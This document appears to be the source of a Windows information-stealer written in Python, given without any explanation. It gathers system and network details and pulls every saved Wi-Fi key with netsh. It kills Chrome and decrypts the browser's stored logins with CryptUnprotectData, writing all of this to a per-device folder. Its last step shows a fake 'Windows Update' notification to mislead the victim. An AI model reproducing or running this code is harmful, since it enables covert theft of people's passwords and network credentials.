import pkg_resources.py2_warn    #pkg_resources.py2_warn
from rx7 import write
import os,subprocess,re,platform,uuid,sys #socket
from colored import attr,fg

Device_Name= platform.node()+' - '+os.getlogin()

def ADD_DEVICE():
    try:    os.mkdir('F')
    except: pass
    try:    os.mkdir('.\\F\\' + Device_Name)
    except: pass
ADD_DEVICE()

WIFIS=set(list(x[2:] for x in re.findall(r': .*', subprocess.getoutput('netsh wlan show profiles'))))

def SysINFO():
    try:
        write(f'.\\F\\{Device_Name}\\Info',mode='replace',text=f'SI:\n{platform.uname()}\nMac: {subprocess.getoutput("getmac")}\n\nWIFI:\n{WIFIS}')        
        write(f'.\\F\\{Device_Name}\\Alpha_SystemINFO',subprocess.getoutput("systeminfo"))
    except:
        pass
SysINFO()

def WFPS():
    try:
        dic={}
        for wifi in WIFIS:
            a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
            try:
                new=re.search(r'Key Content.*',a)
                new=new.group()
                new= new[new.index(':')+2:]
                dic[wifi]=new 
            except:
                dic[wifi]=None
        if dic:
            write(f'.\\F\\{Device_Name}\\WF PS',str(dic))
        else:
            pass
    except:pass
WFPS()

def CP():
    subprocess.getoutput('taskkill /f /im "chrome.exe"')
    import sqlite3,win32crypt
    for w in os.walk(os.getenv('USERPROFILE')):
        if 'Chrome' in w[1]:
            path = str(w[0]) + '\\Chrome\\User Data\\Default\\Login Data'
    # <Connect to the Database>
    try:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
    except:
        sys.exit(1)
    # <Get the results>
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except:
        pass
    data = cursor.fetchall()
    password =False
    LST=[]
    x,y=[],[]
    if len(data) > 0:
        for result in data:
            # <Decrypt the Password>
            try:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            except:
                y.append(1)
            if password:
                LST.append([result[0],result[1],password])
                x.append(1)
        if LST:
            write(f'.\\F\\{Device_Name}\\ALPHA_CP',text=str(LST))
        else:pass
    else:pass
CP()

from win10toast import ToastNotifier
try:
    toaster = ToastNotifier()
    toaster.show_toast("Windows Update", "New version of the windows is available.",icon_path='Files/VP/not.ico', duration=5)
except: pass
